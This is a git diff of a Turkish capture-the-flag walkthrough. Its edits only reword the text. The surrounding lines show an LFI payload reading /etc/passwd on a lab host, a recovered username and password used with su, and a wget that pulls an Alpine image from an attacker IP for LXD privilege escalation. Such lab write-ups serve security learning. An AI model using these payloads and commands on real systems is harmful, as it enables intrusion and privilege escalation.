@@ -9,7 +9,7 @@ nmap -sS -A -p- -T5 10.129.95.185
 <img width="775" height="256" alt="nmap" src="https://github.com/user-attachments/assets/662d2009-3a12-4235-aa0c-795b3f8e66b4" />
 
 
-TCP tarafında tek bir port açık: **80/tcp**, üzerinde Apache 2.4.29 çalışıyor. Nmap'in verdiği yönlendirme bilgisi çok dikkat çekici:
+TCP tarafında tek bir port açık: **80/tcp**, üzerinde Apache 2.4.29 çalışıyor. Nmap'in verdiği yönlendirme bilgisi dikkat çekici:
 
 ```
 Requested resource was http://10.129.95.185/?file=home.php
@@ -22,7 +22,7 @@ URL yapısına bakıldığında `?file=` parametresiyle sunucu tarafında bir do
 
 ## 2. Web Uygulamasının İncelenmesi — LFI Tespiti
 
-Tarayıcıdan `http://10.129.95.185/?file=home.php` adresine gidiyorum. Sayfa, `file` parametresiyle verilen PHP dosyasını sunucu tarafında dahil edip (include) render ediyor gibi görünüyor. Bu davranışı doğrulamak için klasik bir **Local File Inclusion (LFI)** payload'ı deniyorum — dizin gezinme (`../`) karakterleriyle sunucudaki `/etc/passwd` dosyasını okumaya çalışıyorum:
+Tarayıcıdan `http://10.129.95.185/?file=home.php` adresine gidiyorum. Sayfa, `file` parametresiyle verilen PHP dosyasını sunucu tarafında dahil edip render ediyor gibi görünüyor. Bu davranışı doğrulamak için klasik bir **Local File Inclusion (LFI)** payload'ı deniyorum — dizin gezinme (`../`) karakterleriyle sunucudaki `/etc/passwd` dosyasını okumaya çalışıyorum:
 
 ```
 http://10.129.95.185/?file=/../../../../../../etc/passwd
@@ -39,6 +39,7 @@ LFI'yi RCE'ye çevirmenin en klasik yöntemlerinden biri **log poisoning**'dir: 
 ```
 
 Ancak bu dosyayı LFI üzerinden görüntüleyemiyorum
+
 ---
 
 ## 3. UDP Taraması — TFTP Servisinin Keşfi
@@ -52,7 +53,7 @@ nmap -sU 10.129.95.185
 <img width="301" height="49" alt="udp" src="https://github.com/user-attachments/assets/abc165e7-74fd-48a6-8caa-5fb92130f423" />
 
 
-**TFTP (Trivial File Transfer Protocol)** servisinin açık olduğunu görüyorum. TFTP, kimlik doğrulaması olmayan, basit ve genellikle dikkatsizce yapılandırılan bir dosya transfer protokolü
+**TFTP (Trivial File Transfer Protocol)** servisinin açık olduğunu görüyorum.
 
 ---
 
@@ -109,8 +110,7 @@ mike:Sheffield19
 
 <img width="504" height="506" alt="şifre" src="https://github.com/user-attachments/assets/da7ef094-97f2-4ad8-89ac-733d14d948a0" />
 
-
-Bu, klasik bir Apache Basic Authentication kimlik bilgisi dosyası ve içinde açık bir kullanıcı adı/parola çifti var — tipik bir **yanal hareket (lateral movement)** fırsatı. Bu bilgiyle `mike` kullanıcısına geçiş yapıyorum:
+Bu, klasik bir Apache Basic Authentication kimlik bilgisi dosyası ve içinde açık bir kullanıcı adı/parola çifti var. Bu bilgiyle `mike` kullanıcısına geçiş yapıyorum:
 
 ```bash
 su mike
@@ -167,6 +167,7 @@ wget http://10.10.14.156:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
 lxc image import ./alpine*.tar.gz --alias myimage
 lxd init
 ```
+
 <img width="816" height="241" alt="1" src="https://github.com/user-attachments/assets/e8fc5eea-abea-4214-ab08-3586ad863bf5" />
 
 
